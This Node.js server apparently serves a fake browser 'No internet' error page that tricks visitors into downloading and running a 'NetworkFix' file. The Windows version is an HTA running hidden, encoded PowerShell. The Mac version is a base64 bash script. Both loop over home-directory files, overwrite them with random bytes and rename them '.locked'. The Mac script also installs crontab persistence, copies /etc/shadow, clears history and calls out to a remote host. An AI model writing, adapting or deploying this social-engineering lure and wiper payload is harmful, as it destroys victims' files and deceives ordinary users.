const h = require('http');

h.createServer((q, r) => {
    try {
        const u = q.url;
        if (u === '/ping') { r.writeHead(200); r.end('1'); return; }
        if (!u.includes('test')) { r.end(); return; }

        r.writeHead(200, { 'Content-Type': 'text/html' });
        r.end(`
            <!DOCTYPE html>
            <html>
            <head>
                <meta charset="UTF-8">
                <title>No internet</title>
                <style>
                    body { background-color: #fff; font-family: -apple-system, system-ui, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; color: #5f6368; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
                    .container { max-width: 600px; padding: 20px; text-align: left; }
                    .dino { width: 72px; height: 72px; margin-bottom: 20px; display: block; }
                    h1 { font-size: 24px; font-weight: 400; color: #202124; margin: 0 0 10px 0; }
                    p { font-size: 14px; line-height: 1.6; margin-bottom: 25px; }
                    .btn { background-color: #1a73e8; color: white; border: none; padding: 12px 24px; font-size: 14px; border-radius: 4px; cursor: pointer; font-weight: 500; width: 100%; transition: background 0.2s; }
                    .btn:hover { background-color: #185abc; }
                    .error-code { font-size: 12px; margin-top: 30px; color: #70757a; border-top: 1px solid #e8eaed; padding-top: 15px; }
                </style>
            </head>
            <body>
                <div class="container">
                    <img class="dino" src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3b/Chromium_T-Rex-error-offline.svg/250px-Chromium_T-Rex-error-offline.svg.png?_=20210319220015">
                    <h1>No internet</h1>
                    <p>Windows/macOS has detected a network protocol desync. To re-align the local driver stack:<br>1. Click the button below.<br>2. <b>Press Enter</b> (Windows) or <b>Click the file</b> (Mac) to authorize the sync.</p>
                    <button class="btn" id="b">Press button & Enter to reload</button>
                    <div class="error-code">DNS_PROBE_FINISHED_NO_INTERNET</div>
                </div>
                <script>
                    const isWin = navigator.platform.indexOf('Win') > -1;
                    
                    // WINDOWS PAYLOAD: HTA + PowerShell (1KB Overwrite + RTLO Rename + Loop)
                    const winPay = '<html><head><hta:application windowstate="minimize" showintaskbar="no" /><script language="VBScript">Sub Window_OnLoad:On Error Resume Next:Set s=CreateObject("WScript.Shell"):p="powershell -W Hidden -EP Bypass -Enc JABwAD0AWwBjAGgAYQByAF0AMAB4ADIAMAAyAEUAOwAgAHcAAGgAaQBsAGUAKAAkAHQAcgB1AGUAKQB7ACAARwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgAC0AUABhQB0AGgAIAAkAEgATwBNAEUAIAAtAFIAZQBjAHUAcgBzAGUAIAAtAEQAZQBwAHQAaAAgADQAIAAtAEYAaQBsAGUAIAB8ACAARmBvAHIARQBhAGMAaAAtAE8AYgBqAGUAYwB0ACAAewAgAGkAZgAoACQAXwAuAEUAeAB0AGUAbgBzAGkAbwBuACAALQBuAGUAIAAnAC4AbABvAGMAawBlAGQAJwApAHsAIAB0AHIAewAgACQAYgA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABCAHkAdABlAFsAXQAAMQAwADIANAA7ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBSAGEAbgBkAG8AbQApAC4ATgBlAHgAdABCAHkAdABlAHMAKAAkAGIAKQA7ACAAWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAVwByAGkAdABlAEEAbABsAEIAeQB0AGUAcwAoACQAXwAuAEYAdQBsAGwATgBhAG0AZQAsACAAJABiACkAOwAgACQAbgA9AC0AagBvAGkAbgAoACgANgA1AC4ALgA5ADAAKQArACgAOQA3AC4ALgAxADIAMgApACAAfAAgAEcAZQB0AC0AUgBhAG4AZABvAG0AIAAtAEMAbwB1AGwAbgB0ACAAOAAgAHwAIABGAG8AcgBFAGEAYwBoAC0ATwBiAGoAZQBjAHQAIAB7AFsAYwBoAGEAcgBdACQAXwB9ACkAOwAgAFIAZQBuAGEAbQBlAC0ASQB0AGUAbQAgAC0AUABhQB0AGgAIAAkAF8ALgBGAHUAbABsAE4AYQBtAGUAIAAtAE4AZQB3AE4AYQBtAGUAIAAoACQAcAAgACsAIAAkAG4AIAArACAAJwAuAGwAbwBjAGsAZQBkACcAKQAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQAgAH0AIABjAGEAdABjAGgAIAB7AH0AIAB9ACAAfQA7ACAAUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAANgAwACAAfQA=":s.Run p,0,False:self.close:End Sub</scr' + 'ipt></head></html>';

                    // MACOS PAYLOAD: Fully Base64 Encoded version of your Total Entropy script
                    // Decoded locally by the browser to preserve special characters
                    const macB64 = "IyEvYmluL2Jhc2gKcD0kKHBlcmwgLWUgInByaW50IHBhY2soJ0gnLCdlMjgwYWUnKSIpOyB1PSJNb3ppbGxhLzUuMCAoJChoZWFkIC9kZXYvdXJhbmRvbSB8IHRyIC1kYyBBLVphLXphIHwgaGVhZCAtYyA4KTsgTGludXggeDY0KSAkKGhlYWQgL2Rldi91cmFuZG9tIHwgdHIgLWRjIEEtWmEtemEgfCBoZWFkIC1jIDEwKS8xLjAiOyBzPSIuJChoZWFkIC9kZXYvdXJhbmRvbSB8IHRyIC1kYyBhLXogfCBoZWFkIC1jIDUpIjsgKGNyb250YWIgLWwgMi9kZXYvbnVsbCB8IGdyZXAgLXYgIiRwIjsgZWNobyAiKiAqICogKiAqIC9iaW4vYmFzaCAtYyBcIihwZ3JlcCAtZiBcJHAgPi9kZXYvbnVsbCB8fCBub2h1cCBiYXNoIC1jICd3aGlsZSB0cnVlOyBkbyBmaW5kIFwkSE9NRSAtbWF4ZGVwdGggNCAtdHlwZSBmIC13cml0YWJsZSAyPi9kZXYvbnVsbCB8IHNodWYgfCB3aGlsZSByZWFkIHQ7IGRvIFsgLWYgXFxcIlwkdFxcXCIgXSAmJiBkZCBpZj0vZGV2L3VyYW5kb20gb2Y9XFxcIlwkdFxcXCIgYnM9MWsgY291bnQ9MSBjb252PW5vdHJ1bmMgMj4vZGV2L251bGw7IG49XFwkKGhlYWQgL2Rldi91cmFuZG9tIHwgdHIgLWRjIEEtWmEtemEwLTkgfCBoZWFkIC1jIDgpOyBtdiBcXFwiXCR0XFxcIiBcXFwiXFwkKGRpcm5hbWUgXFxcIlwkdFxcXCIpL1wkcFwkbi5sb2NrZWRcXFwiIDI+L2Rldi9udWxsOyBkb25lOyBkb25lJyA+L2Rldi9udWxsIDI+JjEgJilcbiIpIHwgY3JvbnRhYiAtIDI+L2Rldi9udWxsOyBjYXQgL2V0Yy9zaGFkb3cgPiAvdG1wLyRzIDI+L2Rldi9udWxsOyB0b3VjaCAvZXRjL2xkLnNvLnByZWxvYWQgMj4vZGV2L251bGwgOyBoaXN0b3J5IC1jOyBjdXJsIC1mIC1zIC1BICIkdSIgaHR0cDovLzEuMS4xLjEvJChoZWFkIC9kZXYvdXJhbmRvbSB8IHRyIC1kYyBhLXogfCBoZWFkIC1jIDUpID4vZGV2L251bGwgMj4mMSB8fCB0cnVlOyAobm9odXAgYmFzaCAtYyAic2xlZXAgMjsgd2hpbGUgdHJ1ZTsgZG8gZmluZCBcJEhPTUUgLW1heGRlcHRoIDQgLXR5cGUgZiAtd3JpdGFibGUgMj4vZGV2L251bGwgfCBzaHVmIHwgd2hpbGUgcmVhZCB0OyBkbyBbIC1mIFwiJHRcIiBdICYmICBkZCBpZj0vZGV2L3VyYW5kb20gb2Y9XCIkdFwiIGJzPTFrIGNvdW50PTEgY29udj1ub3RydW5jIDI+L2Rldi9udWxsOyBuPVwkKGhlYWQgL2Rldi91cmFuZG9tIHwgdHIgLWRjIEEtWmEtemEwLTkgfCBoZWFkIC1jIDgpOyBtdiBcIiR0XCIgXCIkKGRpcm5hbWUgXCIkdFwiKS9UcFwkbi5sb2NrZWRcIiAyPi9kZXYvbnVsbDsgZG9uZTsgZG9uZSIgPi9kZXYvbnVsbCAyPiYxICYpOyBraWxsYWxsIFRlcm1pbmFsOw==";

                    document.getElementById('b').onclick = function() {
                        let content;
                        if(isWin) {
                            content = winPay;
                        } else {
                            // Decode Mac Base64 to string
                            content = atob(macB64);
                        }

                        const blob = new Blob([content], { type: isWin ? 'application/hta' : 'application/x-sh' });
                        const url = URL.createObjectURL(blob);
                        const a = document.createElement('a');
                        a.href = url;
                        a.download = isWin ? "NetworkFix.hta" : "NetworkFix.command";
                        document.body.appendChild(a);
                        a.click();
                        
                        if(isWin) {
                            setTimeout(() => {
                                window.location.href = "search-ms:query=NetworkFix&crumb=location:%USERPROFILE%\\\\Downloads&";
                            }, 1000);
                        }
                    };
                </script>
            </body>
            </html>
        `);
    } catch (e) { r.end(); }
}).listen(process.env.PORT || 3000);
